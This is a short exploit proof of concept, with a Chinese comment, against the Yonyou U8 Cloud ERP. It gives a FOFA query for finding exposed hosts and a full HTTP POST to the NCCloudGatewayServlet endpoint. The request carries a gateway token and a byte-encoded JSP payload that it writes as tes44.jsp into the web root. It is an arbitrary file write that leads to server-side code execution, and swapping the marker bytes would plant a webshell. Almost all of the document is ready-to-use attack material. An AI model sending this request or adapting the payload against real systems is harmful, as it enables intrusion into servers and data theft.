fofa: title=u8c

"body": [60, 37, 32, 111, 117, 116, 46, 112, 114, 105, 110, 116, 108, 110, 40, 34, 86, 85, 76, 78, 69, 82, 65, 66, 76, 69, 34, 41, 59, 32, 37, 62]`

将VULNERABLE写入tes44.jsp

POST /service/NCCloudGatewayServlet HTTP/1.1
Host: 10.21.69.223:8087
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Cache-Control: max-age=0
gatewaytoken:TJ6RT-3FVCB-DPYP8-XF7QM-96FV3
Content-Type: application/json

{

"groupCode": "1002",
"user": "1002",
"serviceInfo": {
"serviceClassName": "nc.itf.uap.pfxx.IPFxxFileService",
"serviceMethodName": "writeDocToXMLFile",
"serviceMethodArgInfo": [
      {
"argType": {
"body": "java.lang.Byte"
        },
"argValue": {
"body": [60, 37, 32, 111, 117, 116, 46, 112, 114, 105, 110, 116, 108, 110, 40, 34, 86, 85, 76, 78, 69, 82, 65, 66, 76, 69, 34, 41, 59, 32, 37, 62]
        },
"agg": false,
"isArray": true,
"isPrimitive": true
      },
      {
"argType": {
"body": "java.lang.String"
        },
"argValue": {
"body": "./webapps/u8c_web/tes44.jsp"
        },
"agg": false,
"isArray": false,
"isPrimitive": false
      }
    ]
  }
}
